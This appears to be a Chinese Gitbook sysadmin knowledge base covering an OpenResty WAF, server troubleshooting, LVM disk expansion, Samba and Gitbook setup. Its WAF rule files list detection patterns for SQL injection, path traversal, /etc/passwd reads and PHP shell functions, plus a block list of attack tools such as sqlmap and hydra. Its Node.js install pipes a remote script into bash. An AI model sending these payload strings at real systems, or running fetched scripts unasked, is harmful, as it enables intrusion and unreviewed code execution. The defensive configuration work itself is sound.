openresty -t && openresty -s reload WAF模块配置文件详解 来学习一下waf/config.lua配置文件中的内容 cat /usr/local/openresty/nginx/conf/waf/config.lua --lua文件中，--为行注释， --[[ 这是块注释 --]] cat /usr/local/openresty/nginx/conf/waf/config.lua config_waf_enable = \"on\" --是否启用waf模块，值为 on 或 off config_log_dir = \"/tmp\" --waf的日志位置，日志格式默认为json config_rule_dir = \"/usr/local/openresty/nginx/conf/waf/rule-config\" --策略规则目录位置，可根据情况变动 config_white_url_check = \"on\" --是否开启URL检测 config_white_ip_check = \"on\" --是否开启IP白名单检测 config_black_ip_check = \"on\" --是否开启IP黑名单检测 config_url_check = \"on\" --是否开启URL过滤 config_url_args_check = \"on\" --是否开启Get参数过滤 config_user_agent_check = \"on\" --是否开启UserAgent客户端过滤 config_cookie_check = \"on\" --是否开启cookie过滤 config_cc_check = \"on\" --是否开启cc攻击过滤 config_cc_rate = \"10/60\" --cc攻击的速率/时间，单位为秒；默认示例中为单个IP地址在60秒内访问同一个页面次数超过10次则认为是cc攻击，则自动禁止此IP地址访问此页面60秒，60秒后解封(封禁过程中此IP地址依然可以访问其它页面，如果同一个页面访问次数超过10次依然会被禁止) config_post_check = \"on\" --是否开启POST检测 config_waf_output = \"html\" --对于违反规则的请求则跳转到一个自定义html页面还是指定页面，值为 html 和 redirect config_waf_redirect_url = \"https://www.unixhot.com\" --指定违反请求后跳转的指定html页面 --指定违反规则后跳转的自定义html页面 config_output_html=[[ 网站防火墙 欢迎白帽子进行授权安全测试，安全漏洞请联系QQ：1111111。 ]] IP黑名单配置 需要在config.lua中开启config_black_ip_check = \"on\"参数 IP黑名单配置非常简单，这个与Nginx的ngx_http_access_module模块原理是一致的，只需要把拒绝的地址加入到 waf/rule-config/blackip.rule文件中即可 cat /usr/local/openresty/nginx/conf/waf/rule-config/blackip.rule 192.168.1.4 然后访问Openresty地址，如下已返回403被禁止 IP白名单配置 需要在config.lua中开启config_white_ip_check = \"on\"参数 IP白名单与黑名单相冲突，添加到IP白名单中的IP不受WAF限制,具体请自行测试 cat /usr/local/openresty/nginx/conf/waf/rule-config/whiteip.rule 192.168.1.4 CC攻击过滤 需要在config.lua中开启config_cc_check = \"on\"参数，然后指定config_cc_rate = \"10/60\"速率和时间 CC攻击只需要在config.lua配置文件中指定上面的两个参数即可 如下指定在60秒内对于单个IP地址访问单个页面的次数最大10次，超过10次则自动拉入黑名单，60秒后自动解除 vim /usr/local/openresty/nginx/conf/waf/config.lua config_cc_check = \"on\" config_cc_rate = \"10/60\" 然后进行测试,如下刷新10次以后就变为来403 我们换个页面再次刷新，如下换个页面可以正常访问，不过连续对一个页面60秒内刷新10次以后将也被拉入黑名单 异常URL策略配置 需要在config.lua中开启config_url_check = \"on\"参数 然后定义rule-config/url.rule文件，url.rule文件默认为如下，如果匹配到规则的将跳转到由config.lua中config_waf_output = \"html\"参数指定的页面 禁止URL访问 .htaccess|.bash_history 的文件 禁止URL访问包含带有phpmyadmin|jmx-console|admin-console|jmxinvokerservlet地址 禁止URL访问包含 java.lang 的地址 禁止URL访问包含 .svn/ 的地址 cat url.rule \\.(htaccess|bash_history) \\.(bak|inc|old|mdb|sql|backup|java|class|tgz|gz|tar|zip)$ (phpmyadmin|jmx-console|admin-console|jmxinvokerservlet) java\\.lang \\.svn\\/ /(attachments|upimg|images|css|uploadfiles|html|uploads|templets|static|template|data|inc|forumdata|upload|includes|cache|avatar)/(\\\\w+).(php|jsp) 假如你不想让别人访问根下的/login，那么就可以写入到配置中 cat url.rule \\.(htaccess|bash_history) \\.(bak|inc|old|mdb|sql|backup|java|class|tgz|gz|tar|zip)$ (phpmyadmin|jmx-console|admin-console|jmxinvokerservlet) java\\.lang \\.svn\\/ /(attachments|upimg|images|css|uploadfiles|html|uploads|templets|static|template|data|inc|forumdata|upload|includes|cache|avatar)/(\\\\w+).(php|jsp) /login 然后进行重启后访问,如下就跳转到了我们在config.lua中指定的页面，此页面可根据需求进行修改。如果上面默认的url规则匹配到了你的地址，那么你就可以把相应配置去掉 异常UserAgent策略配置 需要在config.lua中开启config_user_agent_check = \"on\"参数 WAF模块中默认封锁了以下UserAgent，如 HTTrack网站下载 namp网络扫描 audit网络审计 dirbuster网站目录扫描 pangolin SQL注入工具 scan网络扫描 hydra密码暴力破解 libwww漏洞工具 sqlmap自动SQL注入工具 w3af网络扫描 Nikto Web漏洞扫描 … 等等 cat useragent.rule (HTTrack|harvest|audit|dirbuster|pangolin|nmap|sqln|-scan|hydra|Parser|libwww|BBBike|sqlmap|w3af|owasp|Nikto|fimap|havij|PycURL|zmeu|BabyKrokodil|netsparker|httperf|bench) 我们正常访问URL是没问题的，下面来模拟一个非法的UserAgent进行访问 #模拟网站下载 curl http://192.168.31.219/ --user-agent 'HTTrack' 网站防火墙 欢迎白帽子进行授权安全测试，安全漏洞请联系QQ：1111111。 #模拟nmap网络扫描 curl http://192.168.31.219/ --user-agent 'nmap' 网站防火墙 欢迎白帽子进行授权安全测试，安全漏洞请联系QQ：1111111。 添加禁止Chrome浏览器访问的UserAgent #跟随配置添加到最后 cat useragent.rule (HTTrack|harvest|audit|dirbuster|pangolin|nmap|sqln|-scan|hydra|Parser|libwww|BBBike|sqlmap|w3af|owasp|Nikto|fimap|havij|PycURL|zmeu|BabyKrokodil|netsparker|httperf|bench|Chrome) 然后重启Openrestry，通过Chrome浏览器进行访问，命中了WAF的规则 异常Get参数策略配置 需要在config.lua配置中开启config_url_args_check = \"on\"参数 默认封锁了如下： cat args.rule \\.\\./ \\:\\$ \\$\\{ select.+(from|limit) (?:(union(.*?)select)) having|rongjitest sleep\\((\\s*)(\\d*)(\\s*)\\) benchmark\\((.*)\\,(.*)\\) base64_decode\\( (?:from\\W+information_schema\\W) (?:(?:current_)user|database|schema|connection_id)\\s*\\( (?:etc\\/\\W*passwd) into(\\s+)+(?:dump|out)file\\s* group\\s+by.+\\( xwork.MethodAccessor (?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\( xwork\\.MethodAccessor (gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\\:\\/ java\\.lang \\$_(GET|post|cookie|files|session|env|phplib|GLOBALS|SERVER)\\[ \\验证 我们进行访问 http://192.168.31.219/hello?aa=select id from mysql,得到如下，进行匹配 curl 'http://192.168.31.219/hello?aa=select id from mysql' 网站防火墙 欢迎白帽子进行授权安全测试，安全漏洞请联系QQ：1111111。 我们也可以根据自己需求去配置，如下最后添加abcops cat args.rule \\.\\./ \\:\\$ \\$\\{ select.+(from|limit) (?:(union(.*?)select)) having|rongjitest sleep\\((\\s*)(\\d*)(\\s*)\\) benchmark\\((.*)\\,(.*)\\) base64_decode\\( (?:from\\W+information_schema\\W) (?:(?:current_)user|database|schema|connection_id)\\s*\\( (?:etc\\/\\W*passwd) into(\\s+)+(?:dump|out)file\\s* group\\s+by.+\\( xwork.MethodAccessor (?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\( xwork\\.MethodAccessor (gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\\:\\/ java\\.lang \\$_(GET|post|cookie|files|session|env|phplib|GLOBALS|SERVER)\\[ \\异常POST参数策略配置 需要在config.lua中开启config_post_check = \"on\"选项，默认POST请求封禁如下，POST封禁内容与GET相似 cat post.rule \\.\\./ select.+(from|limit) (?:(union(.*?)select)) having|rongjitest sleep\\((\\s*)(\\d*)(\\s*)\\) benchmark\\((.*)\\,(.*)\\) base64_decode\\( (?:from\\W+information_schema\\W) (?:(?:current_)user|database|schema|connection_id)\\s*\\( (?:etc\\/\\W*passwd) into(\\s+)+(?:dump|out)file\\s* group\\s+by.+\\( xwork.MethodAccessor (?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\( xwork\\.MethodAccessor (gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\\:\\/ java\\.lang \\$_(GET|post|cookie|files|session|env|phplib|GLOBALS|SERVER)\\[ \\ 网站防火墙 欢迎白帽子进行授权安全测试，安全漏洞请联系QQ：1111111。 如上命中规则，我们查看Openrestry日志，查看是否为POST请求 tail -1 /usr/local/openresty/nginx/logs/access.log 192.168.31.217 - - [27/Jul/2020:18:21:32 +0800] \"POST /hello?aa=select id from mysql HTTP/1.1\" 403 313 \"-\" \"curl/7.29.0\" Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/web/Linux服务器故障排查基本方案.html":{"url":"doc/web/Linux服务器故障排查基本方案.html","title":"Linux服务器故障排查基本方案","keywords":"","body":"Linux服务器故障排查基本方案 服务器架构 服务器系统为Centos7 首先需要知晓系统的对外的架构 一般架构： 1.域名--->云服务器（ECS） 2.域名--->CDN--->云服务器（OSS） 3.域名--->CDN--->云服务器ECS+数据库RDS+缓存Redis 4.域名--->CDN--->负载均衡--->云服务器ECS+数据库RDS(主从)+缓存Redis 5.域名--->CDN-->WAF防火墙--->负载均衡--->云服务器ECS+数据库RDS(主从)+缓存Redis 再根据实际情况出现的问题，一步步排查。 发现问题 一、发现问题 首先发现问题，及时确定哪个服务出现问题，以便方便快速定位问题。查找对应的域名和设备 Zabbix监控发钉钉告警 阿里云监控告警短信 【阿里云】尊敬的***,云监控-云数据库RDS版于发生报警，CPU使用率（91.88>=80），持续时间4分钟 3.shell脚本邮件告警 4.其他同事 客服、市场同事等钉钉、电话报告出现的问题 二、快速定位问题 网络带宽（CDN是否异常） 域名是否解析到源站 登录阿里云CDN后台查看相应流量 负载均衡 检查负载均衡是否正常运行，是否流量异常 应用层服务器 ECS服务器负载是否正常、cpu、内存负载是否过高，硬盘使用率是否达到100%等 缓存服务器 redis服务器负载是否正常、内存使用率如何 数据库服务器 数据库连接数是否正常 列出当前用户的所有连接信息； show full processlist; 杀进程，时长消耗太长的sql进程 select concat('kill ', id, ';') from information_schema.processlist where command != 'Sleep' and time > 2*60 order by time desc; 让将sql语句发给后端研发分析 远程连接服务器 问题：CPU高，负载高，访问慢（数据库正常） 系统层面 查看负载 查看负载、CPU、内存、上线时间、高资源进程 # top 安装： yum -y install htop # htop 查看top服务器负载，内存消耗，df -h查看硬盘 top df 查看nginx日志 如果有nginx日志，进入nginx日志目录 按照日志大小排列 判断日志访问、相应时长，url等 cd /data/wwwroot/log ll -Srh tail -f XXX.XXX.COM-access.log 分析日志，找出最多的IP日志、最多的URL等 GoAccess 、ELK后台查看日志 查看磁盘使用情况 df -h 查看磁盘当前情况 iostat -x -k 3 3 avg-cpu: %user %nice %system %iowait %steal %idle 3.70 0.00 2.25 0.41 0.00 93.64 Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util vda 0.01 0.83 0.30 1.48 11.34 12.13 26.30 0.01 6.15 7.41 5.89 0.24 0.04 vdb 0.00 0.17 0.02 0.28 0.08 2.75 19.15 0.00 3.22 2.01 3.29 0.26 0.01 vdc 0.10 0.84 3.09 0.56 105.22 20.57 68.94 0.02 7.96 3.29 33.74 1.33 0.49 如果发现当前磁盘忙碌，则查看是哪个 PID 在忙碌： 安装 yum install -y iotop # iotop -o -P -k -d 5 查看对外服务和端口 # netstat -tunpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:62920 0.0.0.0:* LISTEN 29177/vsftpd tcp 0 0 0.0.0.0:8080 0.0.0.0:* LISTEN 4393/httpd tcp 0 0 0.0.0.0:7300 0.0.0.0:* LISTEN 4697/php-fpm: maste 查看 PID 具体在 安装 yum install lsof lsof -p PID lsof -p 29177 lsof -p 4697 查看系统日志 tail -400f /var/log/messages tail -f /var/log/messages tail -n100 /var/log/messages head -n100 /var/log/messages 查看简化线程树 pstree -a >> /root/pstree.log 网络问题 ping域名 ping www.XXX.com 查看网络节点情况 安装： yum install -y traceroute traceroute www.baidu.com 问题：CPU 低，负载高，访问慢（数据库） 判断的数据库 1.慢查询 检查慢查询日志，可能是慢查询引起负载高，根据配置文件查看存放位置：log_slow_queries 2.是否有系统瓶颈 升级系统cpu、内存、硬盘， 优化架构增加主从，一主多从等。 3.sleep连接是否过多 show full processlist; 4.查看最大连接数 查看设置的最大连接数 show variables like 'max_connections'; 重新设置最大连接数 set GLOBAL max_connections=300 Nginx防护基本命令 如果有一些异常访问，可以加入配合阿里云的WAF。 访问最多真实用户的IP cat www.XXXX.com-access.log |awk '{print $5}'| awk -F\":\" '{print $NF}' |sort|uniq -c|sort -nr|head -10 查看访问排行前10的url cat www.XXX.com-access.log | awk '{print $10}' | sort | uniq -c | sort -nr | head -n 10 执行时间最长10条 cat www.XXX.com-access.log | sort -nr | head -n 10 查看http_referer来路： cat www.XXX.com-access.log | awk -F\"from:\" '{print $NF}' |sort|uniq -c|sort -nr|head -10 封IP，查看特定的referer来源地址 服务器防火墙封ip 封IP段 /sbin/iptables -I INPUT -s 61.37.80.0/24 -j DROP #屏蔽单个IP的命令是 deny 123.45.6.7 #封整个段即从123.0.0.1到123.255.255.254的命令 deny 123.0.0.0/8 禁止特定用户代理（User Agents）访问 if ($http_user_agent ~* (wget|curl|Firefox) ) { return 404; } 特定的地址攻击做跳转 rewrite ^/accounts/\\+\\$str\\+ http://127.0.0.1/ redirect; 根据 user_agent 控制客户端访问 location / { if ($http_user_agent ~ 'bingbot/2.0|MJ12bot/v1.4.2|Spider/3.0|YoudaoBot|Tomato|Gecko/20100315'){ return 403; } } 图片防盗链 valid_referers none blocked *.XXX.com server_names ~\\.google\\. ~\\.baidu\\.; if ($invalid_referer) { # return 403; rewrite ^/ http://www.XXX.com/daoling.png; } 不允许host为localhost访问 if ($host = 'localhost') { return 403; } 不允许agent为空 if ($http_user_agent ~ ^$){ return 403; } 不允许绑定host主机访问 if ($http_x_forwarded_for ~ ^$){ return 402; } Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/file-system/":{"url":"doc/file-system/","title":"文件系统","keywords":"","body":"文件系统 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/file-system/CentOS7下LVM给硬盘扩容操作.html":{"url":"doc/file-system/CentOS7下LVM给硬盘扩容操作.html","title":"CentOS7下LVM给硬盘扩容操作","keywords":"","body":"CentOS7下LVM给硬盘扩容操作 需求：原本在某讯云上100G硬盘不够用，另外购买了500G的硬盘，如果只是将500G挂载到程序文件目录，只能用得上500G，100G用不上，有点浪费空间 lvm可以将两块硬盘相加达到扩容的方案。 先在虚拟机上操作，再在实际环境中操作。 LVM简介 LVM是逻辑盘卷管理（LogicalVolumeManager）的简称，它是Linux环境下对磁盘分区进行管理的一种机制，LVM是建立在硬盘和 分区之上的一个逻辑层，来提高磁盘分区管理的灵活性。通过LVM系统管理员可以轻松管理磁盘分区，如：将若干个磁盘分区连接为一个整块的卷组 （volumegroup），形成一个存储池。管理员可以在卷组上随意创建逻辑卷组（logicalvolumes），并进一步在逻辑卷组上创建文件系 统。 LVM是 Logical Volume Manager(逻辑卷管理)的简写 PV:是物理的磁盘分区 VG:LVM中的物理的磁盘分区，也就是PV，必须加入VG，可以将VG理解为一个仓库统一管理了几个大的硬盘，形成了一个统一虚拟的存储资源池。 LV：也就是从VG中划分的逻辑分区 抽象模型如下： 操作实战 通过在虚拟机的CentOS7上创建LVM ，使用LV，扩容LV，缩减LV实战来了解LVM及熟悉对LVM的操作。 准备工作准备虚拟机，操作系统为CentOS7，初始20G的硬盘 初始状态共20G的系统盘 在虚拟机中添加两块硬盘 启动虚拟机通过pvs命令查看物理卷的情况，目前只看到有虚拟机初始安装时有个pv为/dv/sda2 vg为centso的物理卷 大小为20G 通过fdisk -l 可以看到新加的两个盘大小分别都是5G。我们将用这两个盘组成一个vg，进行lvm的管理。 一、创建LVM逻辑卷 1.创建物理卷 将物理硬盘格式化成PV（物理卷） 使用的是pvcreate命令 (将/dev/sdc /dev/sdb两块硬盘创建为物理卷 # pvcreate /dev/sdb /dev/sdc Physical volume \"/dev/sdb\" successfully created. Physical volume \"/dev/sdc\" successfully created. 通过pvdisplay或pvs查看当前的pv信息，可以看到两块5G的物理卷已经成功创建 2.创建卷组 创建卷组（VG），并将PV加入到卷组中 通过vgcreate命令 # vgcreate vg /dev/sdb /dev/sdc Volume group \"vg\" successfully created 通过vgdisplay或vgs命令查看vg的信息。看到vg已经创建好了，大小是两个pv的大大小也就是5G+5G，大概是10G的样子，这里显示9.99G 3.创建逻辑卷 基于卷组（VG）创建逻辑卷(LV) 通过lvcreate命令 基于vg创建逻辑卷lv,名字为app,大小为2G lvcreate -n app -L 2G vg 实际操作 # lvcreate -n app -L 5.99G vg Rounding up size to full physical extent 5.99 GiB Logical volume \"app\" created. 用lvdisplay或lvs命令查看创建好的逻辑卷。可以看到名字为app的逻辑卷lv已经创建好了，它是基于vg创建的，大小为2G 到这里，lv就创建好了，但是要用起来，还得格式化并挂载到我们的文件系统。 二、格式化并使用逻辑卷 1、格式化 用ext4的格式格式化/dev/vg/app mkfs -t ext4 /dev/vg/app 2、挂载 创建挂载点 mkdir /app 将/dev/vg/app 挂载到/app mount /dev/vg/app /app 然后df -h 可以看到已经挂载到/app下了 ，大小为lv 的大小2G cd /app touch test.txt 在/app下创建一个测试文件test.txt，可以看到该挂载点是可以用了。 设置开机加载 echo \"/dev/vg/app /app ext4 defaults 0 0\" >>/etc/fstab 三、扩容逻辑卷 这里扩容分两种情况，一种情况是vg还有足够的空间，那么就可以直接扩lv就可以了。另外一种情况是要扩的空间已经超过了vg的大小，那么就可以通过加物理磁盘扩充到vg里，然后再扩lv。 第一种情况，扩的空间大小在vg的容量范围之内 现在vg的大小为10G，现在/app是2G，计划扩到8G，没有超过vg的大小那么可以直接扩lv就可以了。 第一步：首先卸载设备和挂载点的关联 umount /app 第二步：将逻辑卷/dev/vg/app 扩展到8G lvextend -L 8G /dev/vg/app 可以清楚的看到vg/app从2G扩容到了8G 第三步：检查硬盘（lv）完整性，并重置硬盘(lv)容量 e2fsck -f /dev/vg/app 检查硬盘完整性 重置硬盘(lv)容量 resize2fs /dev/vg/app 重置硬盘(lv)容量，这一步必需要做，否则即使扩了容量，但看到的还是扩容之前的容量。 第四步：重新挂载硬盘并查看 mount -a df -h 可以看到/app已经成功扩容到8G了 ls 查看/app里面的文件还在，说明扩容对文件数据没有啥影响。 如果扩容的大小超过了vg的大小怎么办呢？可以通过扩硬件的方式，加块硬盘到vg然后再扩lv。 第二种情况，扩容的大小超过了vg的大小 现在vg的大小为10G，现在/app是8G，计划扩到11G，已经没有超过vg的10G大小那么就需要先加硬盘，然后扩vg，再扩lv。 第一步：添加硬盘 通过fdisk -l命令查看添加 第二步：扩容vg 将新的硬盘扩到vg卷组里 卸载/app umount /app vgextend vg /dev/sdd 将新添加的硬盘/dev/sdd添加到vg卷组里 第三步：扩容lv 将逻辑卷/dev/vg/app 扩展到11G lvextend -L 11G /dev/vg/app 可以看到vg/app从原来的8G扩到了11G 第四步：同样检查硬盘（lv）完整性，并重置硬盘(lv)容量 e2fsck -f /dev/vg/app 检查硬盘完整性 resize2fs /dev/vg/app 重置硬盘(lv)容量 第五步：重新挂载硬盘并查看 mount -a df -h 可以看到/app已经成功扩容到11G了 四、缩小逻辑卷 相对于逻辑卷扩容，缩小逻辑卷，数据丢失的风险更大。所以在生产环境中操作一定要注意提前备份好数据。在对LVM逻辑卷进行缩小操作之前，先把要缩小的文件系统卸载并检查文件系统的完整性。 现在我们将/app由现在的11G缩到10G 第一步：卸载/app并检查文件系统完整性 第二步：把逻辑卷缩容到10G resize2fs /dev/vg/app 10G lvreduce -L 10G /dev/vg/app 第三步：重新挂载并查看状态 通过LVM的管理，创建、扩容、缩容，可以看到通过LVM技术可以实现系统存储空间的动态的调整。 基本原理是将多个物理硬盘创建成pv(物理卷)，这些物理卷是动态调整的物理基础，通过vg将pv管理起来形成一个整体的资源池。在vg中划分lv来动态调整逻辑卷的大小。 https://www.cnblogs.com/xiejava/p/10960284.html Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-16 10:42:37 "},"doc/file-system/CentOS7下LVM给腾讯云云硬盘扩容操作.html":{"url":"doc/file-system/CentOS7下LVM给腾讯云云硬盘扩容操作.html","title":"CentOS7下LVM给腾讯云云硬盘扩容操作","keywords":"","body":"CentOS7下LVM给腾讯云云硬盘扩容操作 腾讯云安装ELK后，100G的硬盘不够用了，再购买了500G的硬盘想组成600G，客服居然说不可以，难道腾讯云做了限制了？试试用lvm来给100G的硬盘扩容到600G 实测扩容是可以的 查看硬盘是否购买 # fdisk -l Disk /dev/vda: 53.7 GB, 53687091200 bytes, 104857600 sectors .. Device Boot Start End Blocks Id System /dev/vda1 * 2048 104857566 52427759+ 83 Linux Disk /dev/vdb: 107.4 GB, 107374182400 bytes, 209715200 sectors ... Device Boot Start End Blocks Id System /dev/vdb1 2048 209715199 104856576 83 Linux Disk /dev/vdc: 536.9 GB, 536870912000 bytes, 1048576000 sectors ... 创建物理卷 # pvcreate /dev/vdb /dev/vdc Device /dev/vdb excluded by a filter. Physical volume \"/dev/vdc\" successfully created. 报错，由于 /dev/vdb 以前用过。 使用 parted 修复 导致问题的原因是添加的磁盘是在另一个虚拟机中新建的，已经有了分区表，现在的虚拟机并不能识别磁盘的分区表，运行parted命令重做分区表，中途需要输入三次命令。 # parted /dev/vdb GNU Parted 3.1 Using /dev/vdb Welcome to GNU Parted! Type 'help' to view a list of commands. (parted) (parted) mklabel msdos Warning: The existing disk label on /dev/vdb will be destroyed and all data on this disk will be lost. Do you want to continue? Yes/No? yes (parted) quit Information: You may need to update /etc/fstab. 再次运行pvcreate，问是否擦除dos签名，输入y，就可以将磁盘创建为PV了。 # pvcreate /dev/vdb /dev/vdc WARNING: dos signature detected on /dev/vdb at offset 510. Wipe it? [y/n]: y Wiping dos signature on /dev/vdb. Physical volume \"/dev/vdb\" successfully created. Physical volume \"/dev/vdc\" successfully created. 创建卷组 # vgcreate vg /dev/vdb /dev/vdc Volume group \"vg\" successfully created # vgs VG #PV #LV #SN Attr VSize VFree vg 2 0 0 wz--n- 599.99g 599.99g 创建逻辑卷 基于vg创建逻辑卷lv,名字为app # lvcreate -n app -L 599.99G vg Rounding up size to full physical extent 599.99 GiB Logical volume \"app\" created. 格式化和挂载 用ext4的格式格式化/dev/vg/app mkfs -t ext4 /dev/vg/app mount /dev/vg/app /home echo \"/dev/vg/app /data ext4 defaults 0 0\" >>/etc/fstab mount -a df -h |grep vg /dev/mapper/vg-app 591G 6.1G 555G 2% /home/data Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-16 10:42:53 "},"doc/file-system/Linux安装samba与windows实现共享文件夹.html":{"url":"doc/file-system/Linux安装samba与windows实现共享文件夹.html","title":"Linux安装samba与windows实现共享文件夹","keywords":"","body":"Linux安装samba与windows实现共享文件夹 Linux与Linux间通过什么共享文件呢——NFS，Windows与Windows之间呢——共享文件功能，那Windows与Linux之间通过samba。 samba：只能在内网使用，类似于windows的网络邻居（文件共享服务） samba两个守护进程： smbd 【监听139端口，TCP端口】 负责用户验证和文件共享 nmbd 【监听137和138端口 UDP端口】 负责处理浏览共享和计算机名称解析 检查是否安装samba rpm -qa|grep samba 否则，使用yum安装 # yum install samba 配置samba # chkconfig smb on # chkconfig nmb on /etc/init.d/smb start Centos7 systemctl enable smb.service systemctl enable nmb.service systemctl start smb 新建smb用户用于访问Linux共享文件 # useradd smb # 新建用户 # smbpasswd -a smb # 修改密码 #smbpasswd -x smb # 删除smb用户 此时/home目录会增加一个smb的用户。该Linux用户目录将可直接共享到Windows下。若要共享其它文件，按步骤3配置文件。如果不用了，删除smb用户也是可以的， samba配置文件【/etc/samba/smb.conf】。 [tmp] comment = Tmp Directories path = /tmp # 共享的Linux目录 public = no # 目录不公开 writeable = yes # 可写 browseable = yes # 可读 valid users = smb # 访问用户，上面新建的，也可以使用原来已有的 复制去掉注释 分配权限 chown smb.smb -R /data2T/smb 或者： chmod 777 -R /data2T/smb 让smaba通过防火墙 编辑 /etc/sysconfig/iptables 文件 -A INPUT -m state --state NEW -m tcp -p tcp --dport 139 -j ACCEPT -A INPUT -m state --state NEW -m tcp -p tcp --dport 445 -j ACCEPT -A INPUT -m state --state NEW -m udp -p udp --dport 137 -j ACCEPT -A INPUT -m state --state NEW -m udp -p udp --dport 138 -j ACCEPT 重启防火墙 # /etc/rc.d/init.d/iptables restart 在Windows下使用Win+R开启运行窗口，输入 \\\\192.168.1.6 此时使用 # smbstatus centos7 yum -y install samba samba-client 启动samba systemctl start smb systemctl status smb 设置开机自启动 # systemctl enable smb Created symlink from /etc/systemd/system/multi-user.target.wants/smb.service to /usr/lib/systemd/system/smb.service. 新建smb用户用于访问Linux共享文件 # useradd smb # 新建用户 # smbpasswd -a smb # 修改密码 #smbpasswd -x smb # 删除smb用户 创建需要共享的目录 mkdir -p /data/smb chown smb.smb -R /data/smb samba配置文件【/etc/samba/smb.conf】。 # cp /etc/samba/smb.conf /etc/samba/smb.conf_bak [tmp] comment = Tmp Directories path = /tmp # 共享的Linux目录 public = no # 目录不公开 writeable = yes # 可写 browseable = yes # 可读 valid users = smb # 访问用户，上面新建的，也可以使用原来已有的 复制去掉注释 vi /etc/samba/smb.conf 复制以下内容： [global] workgroup = MYGROUP server string = Samba Server Version %v log file = /var/log/samba/log.%m # max 50KB per log file, then rotate max log size = 50 security = user passdb backend = tdbsam #============================ Share Definitions ============================== [beijing] comment = Tmp Directories path = /data/smb public = no writeable = yes browseable = yes valid users = smb 重启服务 systemctl restart smb 让smaba通过防火墙 vi /etc/sysconfig/iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 139 -j ACCEPT -A INPUT -m state --state NEW -m tcp -p tcp --dport 445 -j ACCEPT -A INPUT -m state --state NEW -m udp -p udp --dport 137 -j ACCEPT -A INPUT -m state --state NEW -m udp -p udp --dport 138 -j ACCEPT 重启防火墙服务 systemctl restart iptables 阿里云服务器ECS的samba配置方法 https://blog.csdn.net/XHG1993/article/details/78872724 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/gitbook/":{"url":"doc/gitbook/","title":"Gitbook","keywords":"","body":"Gitbook Gitbook基本使用方法 Jenkins+Github实现文档持续集成 Github Page怎么绑定自己的域名 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 10:42:22 "},"doc/gitbook/Gitbook.html":{"url":"doc/gitbook/Gitbook.html","title":"Gitbook基本使用方法","keywords":"","body":"使用Gitbook制作发布个人的电子书籍 需求说明 Gitbook可以人每个人制作发布个人的电子书籍，并能最大程度上利用“群智”提高阅读品质和享受创作过程。 gitbook.com网站是一个简单的个人在线书籍网站，在这里可以把自己的文档整理成一本书发布出来，便于阅读，gitbook提供了两套方案， 1.可以直接在gitbook官网上申请账号进行创建。 2.通过他们提供的命令行开发工具自己构建一个。 咱们下面介绍的是第二套方案，gitbook命令行工具首先需要服务器上有node.js，https://nodejs.org/zh-cn/download/ 系统说明 系统： Centos7 IP： 192.168.1.5(云服务器) 地址： https://g.xgss.net/ Github Page地址： gitbook.xgss.net github仓库:https://github.com/funet8/book.git 一、 安装nodejs yum方式安装nodejs和npm nodejs版本不要安卓过高，笔者安装的是nodejs v8版本的，否则会报错：安装的v14.17.6有报错： if (cb) cb.apply(this, arguments) TypeError: cb.apply is not a function at /usr/local/node-v14.17.6/lib/node_modules/gitbook-cli/node_modules/npm/node_modules/graceful-fs/polyfills.js:287:18 at FSReqCallback.oncomplete (fs.js:193:5) 1 更新node.js各版本yum源 Node.js v8.x安装命令 curl --silent --location https://rpm.nodesource.com/setup_8.x | bash - Node.js v7.x安装命令 curl --silent --location https://rpm.nodesource.com/setup_7.x | bash - Node.js v6.x安装命令 curl --silent --location https://rpm.nodesource.com/setup_6.x | bash - Node.js v5.x安装命令 yum安装node.js # yum install -y nodejs # node -v v8.17.0 安装cnpm(对自己网络有信心的大佬可以无视) 因为国内比较慢,我们可以额外安装淘宝的cnpm,慢的时候用cnpm. # npm install -g cnpm --registry=https://registry.npm.taobao.org 二、安装gitbook-cli工具 gitbook-cli是一个在同一系统上安装和使用多个版本的GitBook的实用程序。并自动安装所需版本的GitBook来生成一本书。 执`npm install gitbook-cli -g终端命令进行的安装。 # npm install gitbook-cli -g 可通过gitbook --version验证，如果提示没有此命令需要输入绝对路径，或者创建软链接 # gitbook --version CLI version: 2.3.2 Installing GitBook 3.2.3 注意：终端第一次运行gitbook命令，可能会自动安装gitbook，因为刚才安装的是CLI，然后CLI会自动安装gitbook。 如果想卸载CLI，可使用 npm uninstall gitbook-cli -g来删除。 当然，GitBook 的远比我们想象的强大，我们还可以通过 gitbook help 来查看： # gitbook help 初始化一本书 初始化一本书的命令是gitbook init, 首先在终端创建一个项目目录，并进入这个目录： ~ mkdir git_book ~ cd git_book ~ gitbook init gitbook init会在空项目中创建README.md和SUMMARY.md两个文件： README.md文件是项目的介绍文件。 SUMMARY.md是gitbook书籍的目录。 如果SUMMARY.md文件里面有如下内容： vim SUMMARY.md * [项目介绍](README.md) * http * [http说明](doc/http/http解析.md) * [tcp说明](doc/http/tcp/tcp说明.md) * [udp说明](doc/http/tcp/udp/udp说明.md) * HTML * [HTML5-特性说明](doc/html/HTML5-特性说明.md) 本地启动服务编写书籍 终端打开项目目录，使用gitbook serve启动服务： gitbook serve 